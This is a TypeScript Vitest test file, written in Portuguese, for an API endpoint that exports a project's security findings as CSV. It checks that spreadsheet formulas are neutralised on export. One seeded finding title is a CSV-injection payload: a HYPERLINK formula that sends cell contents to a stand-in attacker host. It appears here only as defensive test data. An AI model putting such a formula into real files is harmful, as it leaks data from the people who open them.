import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { criarAmbienteTeste, type AmbienteTeste } from '../apoio/app-teste.js'
import { criarAchadoApi, criarProjetoApi } from '../apoio/fabricas.js'

/** Lê o CSV gerado (separador ;, células entre aspas). */
function lerCsv(texto: string): string[][] {
  const linhas: string[][] = []
  let linha: string[] = []
  let celula = ''
  let aspas = false
  const t = texto.charCodeAt(0) === 0xfeff ? texto.slice(1) : texto
  for (let i = 0; i < t.length; i++) {
    const c = t[i]!
    if (aspas) {
      if (c === '"' && t[i + 1] === '"') {
        celula += '"'
        i++
      } else if (c === '"') aspas = false
      else celula += c
    } else if (c === '"') aspas = true
    else if (c === ';') {
      linha.push(celula)
      celula = ''
    } else if (c === '\r' && t[i + 1] === '\n') {
      linha.push(celula)
      linhas.push(linha)
      linha = []
      celula = ''
      i++
    } else celula += c
  }
  return linhas
}

describe('GET /api/projetos/{id}/relatorio.csv', () => {
  let t: AmbienteTeste

  beforeAll(async () => {
    t = await criarAmbienteTeste()
  })
  afterAll(async () => {
    await t.banco.encerrar()
  })

  it('exporta todos os achados com fórmulas neutralizadas', async () => {
    const analista = await t.sessaoDe('Analista')
    const dev = await t.sessaoDe('Desenvolvedor')
    const p = await criarProjetoApi(t, analista.cookie, analista.usuario.id)
    await criarAchadoApi(t, analista.cookie, p.id, {
      titulo: '=HYPERLINK("http://atacante.example/?d="&A1,"Clique")',
      descricao: 'Texto com "aspas"; ponto e vírgula\ne quebra de linha',
      localizacao: '@SUM(1+1)',
    })
    await criarAchadoApi(t, analista.cookie, p.id, {
      titulo: 'Achado comum',
      responsavelId: dev.usuario.id,
    })

    const res = await t.requisitar(`/api/projetos/${p.id}/relatorio.csv`, { cookie: dev.cookie })
    expect(res.status).toBe(200)
    expect(res.headers.get('content-type')).toBe('text/csv; charset=utf-8')
    const disposicao = res.headers.get('content-disposition') ?? ''
    expect(disposicao.startsWith(`attachment; filename="${p.prefixo}-achados-`)).toBe(true)
    expect(disposicao.endsWith('.csv"')).toBe(true)
    const linhas = lerCsv(await res.text())
    expect(linhas).toHaveLength(3)
    const [cab, a1, a2] = linhas
    expect(cab![0]).toBe('Código')
    const col = (nome: string) => cab!.indexOf(nome)
    expect(a1![col('Código')]).toBe(`${p.prefixo}-0001`)
    expect(a1![col('Título')]).toBe(`'=HYPERLINK("http://atacante.example/?d="&A1,"Clique")`)
    expect(a1![col('Localização')]).toBe(`'@SUM(1+1)`)
    expect(a1![col('Descrição')]).toBe('Texto com "aspas"; ponto e vírgula\ne quebra de linha')
    expect(a1![col('Severidade')]).toBe('Alta')
    expect(a1![col('CWE')]).toBe('CWE-319')
    expect(a2![col('Responsável')]).toBe(dev.usuario.nome)
    expect(cab).toHaveLength(a1!.length)
  })

  it('projeto inexistente retorna 404', async () => {
    const { cookie } = await t.sessaoDe('Desenvolvedor')
    const res = await t.requisitar(
      '/api/projetos/00000000-0000-4000-8000-000000000000/relatorio.csv',
      { cookie },
    )
    expect(res.status).toBe(404)
  })
})
